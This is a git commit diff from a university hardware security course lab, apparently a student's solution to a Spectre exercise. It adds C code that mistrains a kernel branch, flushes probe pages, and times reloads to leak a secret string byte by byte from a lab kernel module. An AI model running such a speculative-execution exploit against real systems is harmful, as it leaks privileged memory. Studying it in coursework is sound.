df9ce3c473bfed18639515312a07b9badb990848
Andre Alain Kudzo Rastrelly <arastrel@burnsville.cs.unc.edu>
2026-04-08 19:53:25 -0400

    feat: part 2 exercise 4 implemented

--- hwsec-course/lab-spectre/part2-src/attacker-part2.c
+++ hwsec-course/lab-spectre/part2-src/attacker-part2.c
@@ -11,6 +11,10 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define ATTEMPTS 300
+#define THRESHOLD 90
+#define TRAINING 196
+
 /*
  * call_kernel_part2
  * Performs the COMMAND_PART2 call in the kernel
@@ -27,6 +31,48 @@ static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t 
     local_cmd.arg2 = offset;
 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
+}
+
+static unsigned char leak_one_byte_part2(int kernel_fd, char *shared_memory, size_t offset) {
+    int candidates[256] = {0};
+    int access_times[256] = {0};
+
+    // TRAIN
+    for (int i = 0; i < TRAINING; i++) {
+        call_kernel_part2(kernel_fd, shared_memory, 3);
+    }
+
+    // FLUSH
+    for (int attempt = 0; attempt < ATTEMPTS; attempt++) { // ATTEMPTS defined above, can increase/decrease for fine tuning
+        for (int i = 0; i < 256; i++) {
+            clflush(&shared_memory[i * 4096]); // page table size 4096, loop goes through and flushes all pages
+        }
+
+        // VICTIM
+        call_kernel_part2(kernel_fd, shared_memory, offset); // run victim process!!
+
+        // RELOAD 
+        for (int i = 0; i < 256; i++) {
+            int mix_i = ((i * 167) + 13) & 255; // mixed order to counter prefetching optimization
+            //char *addr = &shared_memory[mix_i * 4096];
+            uint64_t dt = time_access(&shared_memory[mix_i * 4096]); // measure access time to mix_i-th page
+            access_times[mix_i] = dt;
+            if (dt < THRESHOLD) {
+                candidates[mix_i]++;
+            }
+        }
+    }
+    
+    // find candidate for fastest access time, meaning victim accessed it
+    int best = 0;
+    for (int i = 1; i < 256; i++) {
+        if (candidates[i] > candidates[best]) {
+            best = i;
+        }
+        printf("\nCandidacy of %d:%d | Time: %d", i, candidates[i], access_times[i]);
+    }
+    printf("\nBest candidate: %d - Value: %d | Time: %d\n", best, candidates[best], access_times[best]);
+    return (unsigned char)best;
 }
 
 /*
@@ -46,10 +92,12 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         char leaked_byte;
 
         // [Part 2]- Fill this in!
-        // leaked_byte = ??
 
+        leaked_byte = (char)leak_one_byte_part2(kernel_fd, shared_memory, current_offset);
         leaked_str[current_offset] = leaked_byte;
+
         if (leaked_byte == '\x00') {
+            printf("\nBroke at offset: %ld\n", current_offset);
             break;
         }
     }
